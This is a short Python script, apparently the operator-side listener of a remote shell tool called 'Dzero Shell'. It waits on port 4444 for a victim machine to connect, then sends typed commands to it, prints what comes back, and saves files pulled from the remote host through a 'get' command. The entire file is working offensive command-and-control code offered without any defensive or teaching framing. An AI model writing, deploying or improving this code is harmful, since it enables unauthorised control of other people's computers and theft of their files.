import os
import socket
import subprocess

host=""
port=4444
s=socket.socket()
s.bind((host,port))
s.listen(5)
conn,add=s.accept()
print(add[0],add[1])
print ("********************   Dzero Shell   ************** ")

while True:
	while True:
		cmd=input()
		if not cmd :
			print("Sorry, I didn't understand that.")
			continue
		else:
			break
	conn.send(cmd.encode())
	buff=conn.recv(90048576)
	if cmd[:3]=='get':
		try :
			with open(cmd[4:],'wb') as file:
				file_data=file.write(buff)
		except :
			print("File not accessible",end="\n")

	if cmd[:3]!='get':
		try :
			print(str(buff,encoding='ascii', errors='replace'),end="")
		except:
			print (" Command not working",end="\n")
		
	if cmd == 'quit':
		conn.close()
		s.close()
	if cmd=='cls':
		os.system(cmd)	
